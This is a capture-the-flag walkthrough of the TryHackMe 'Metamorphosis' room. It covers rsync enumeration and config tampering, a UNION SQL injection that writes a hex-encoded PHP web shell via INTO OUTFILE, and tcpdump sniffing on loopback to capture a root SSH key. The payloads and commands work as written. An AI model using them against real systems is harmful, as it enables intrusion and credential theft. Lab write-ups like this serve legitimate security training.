# 88 - Metamorphosis (RSYNC, SQLI to RCE, sniffing with tcpdump)

Room Link --> [https://tryhackme.com/room/metamorphosis](https://tryhackme.com/room/metamorphosis)

### Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -Pn -n -vvv -T4 10.10.136.119 -p80,139,445,873 -sV

PORT    STATE SERVICE     REASON  VERSION
80/tcp  open  http        syn-ack Apache httpd 2.4.29 ((Ubuntu))
139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
873/tcp open  rsync       syn-ack (protocol version 31)
```
{% endcode %}

#### SMB Enum

We don't have access to the SMB shares.

<figure><img src=".gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### RSYNC Enum

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -sV --script rsync-list-modules -p 873 10.10.136.119

PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)
| rsync-list-modules: 
|_  Conf           	All Confs

# list all the directories
dking@dking ~/Downloads$ rsync 10.10.136.119::                                                                 
Conf           	All Confs
```
{% endcode %}

We can save all the files in the `rsync Conf` folder to a files folder in kali .

{% code overflow="wrap" lineNumbers="true" %}
```bash
dking@dking ~/Downloads$ rsync -av rsync://rsync-connect@10.10.136.119/Conf files                              
receiving incremental file list
created directory files
./
access.conf
bluezone.ini
debconf.conf
ldap.conf
lvm.conf
mysql.ini
php.ini
ports.conf
resolv.conf
screen-cleanup.conf
smb.conf
webapp.ini

sent 255 bytes  received 194,360 bytes  77,846.00 bytes/sec
total size is 193,430  speedup is 0.99
```
{% endcode %}

We got a credential in the `webapp.ini` file.

{% code overflow="wrap" %}
```bash
dking@dking ~/Downloads/files$ cat webapp.ini                                                                   
[Web_App]
env = prod
user = tom
password = theCat

[Details]
Local = No
```
{% endcode %}

#### Gobuster enum

{% code overflow="wrap" lineNumbers="true" %}
```bash
gobuster dir -u http://10.10.136.119 -w /opt/wordlist.txt -b 404,403,500 --no-error -t 500

admin
index.php
```
{% endcode %}

<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We modify the value of  the `env` value in the webapp.ini file to `dev` from `prod` and send it using rsync.

{% code overflow="wrap" %}
```bash
dking@dking ~/Downloads/files$ rsync webapp.ini rsync://rsync-connect@10.10.136.119/Conf                       
```
{% endcode %}

And now we can access the `/admin` page.

<figure><img src=".gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

The room hint said SQL injection, so we can start checking from here.

### SQLI exploitation

#### No of Columns

```sql
# there are 3 columns.
tom" UNION SELECT NULL,NULL,NULL-- -
```

<figure><img src=".gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### SQL Version

{% code overflow="wrap" %}
```sql
tom" UNION SELECT 1,2,@@version-- -

Username Password<br>tom thecat<br />Username Password<br>2 5.7.34-0ubuntu0.18.04.1<br /
```
{% endcode %}

### SQLI to RCE

The intended path of this room is to upload a php reverse shell via SQLI.

```php
# we will use this php code.
<?php system($_GET['cmd']);?>

# hex encode it.
3c3f7068702073797374656d28245f4745545b27636d64275d293b3f3e

# add "0x" to it
0x3c3f7068702073797374656d28245f4745545b27636d64275d293b3f3e
```

Our SQLI payload

{% code overflow="wrap" %}
```sql
tom" UNION SELECT 1,2,0x3c3f7068702073797374656d28245f4745545b27636d64275d293b3f3e INTO OUTFILE "/var/www/html/shell.php"-- -
```
{% endcode %}

Navigate to [http://10.10.136.119/shell.php?cmd=id](http://10.10.136.119/shell.php?cmd=id)

And we get RCE.

<figure><img src=".gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>

From here it's easy to get reverse shell.

<figure><img src=".gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Priv Esc to root

Running LinPEAS on the machine:

<figure><img src=".gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>

we also find that some Active Internet connections (servers and established) on the 127.0.0.1:1024 ( python ) and just below that linpeas also gave us that we can sniff via tcpdump. But for tcpdump, we have to specify the interface on which we have to sniff for that we already know that some service is running on 127.0.0.1 for that we have to sniff the **localhost interface ( loopback )**. We don’t know the interface abbreviation just do ifconfig and you will find it there i.e, **lo**.

<figure><img src="https://miro.medium.com/v2/resize:fit:529/1*G3rk8s0j18lF2csv0Hu2rQ.png" alt="" height="344" width="700"><figcaption></figcaption></figure>

```
tcpdump -i lo port 1027 -c 10 -A -vvv
```

Wait for some time and we got the ssh private key I tried it to login as root and it worked. We finally got root. We can login as root.

`ssh root@10.10.136.119 -i id_rsa`&#x20;

**Bonus:** There are two extra files in the root directory. One is the req.sh and another is serv.py. So serv.py is the flask app hosted on 127.0.0.1:1024 which has the private key and system continuously executing the req.sh which is sending the curl request to the flask server if the value of admin is correct it returns our private key.

<figure><img src="https://miro.medium.com/v2/resize:fit:501/1*CZyiUOAvvwqtNtTfm5NH1g.png" alt="" height="497" width="662"><figcaption></figcaption></figure>

Done!

